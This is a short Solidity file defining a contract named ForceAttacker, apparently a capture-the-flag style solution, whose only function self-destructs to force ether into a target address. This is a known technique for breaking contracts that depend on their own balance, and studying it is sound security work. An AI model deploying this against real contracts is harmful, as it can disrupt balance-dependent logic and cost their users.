// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    function callSelfdestruct(address payable addr) external payable {
        selfdestruct(addr);
    }
}
